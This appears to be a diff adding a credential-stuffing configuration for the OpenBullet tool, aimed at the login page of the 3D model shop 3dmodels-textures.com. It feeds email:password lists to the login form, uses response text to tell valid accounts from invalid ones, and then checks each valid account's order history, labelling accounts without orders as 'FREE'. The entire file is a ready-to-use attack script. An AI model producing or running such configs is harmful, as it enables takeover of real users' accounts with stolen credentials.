@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "3dmodels-textures",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-17T20:20:57.5674953+00:00",
+  "AdditionalInfo": "",
+  "Author": "Secant",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "https://www.3dmodels-textures.com/index.php?route=account/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Warning: No match for" 
+  KEYCHAIN Success OR 
+    KEY "View your order history" 
+#GET_Orders REQUEST GET "https://www.3dmodels-textures.com/index.php?route=account/order" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.3dmodels-textures.com/index.php?route=account/account" 
+#Order_KEY_CHECK KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You have not made any previous orders" 
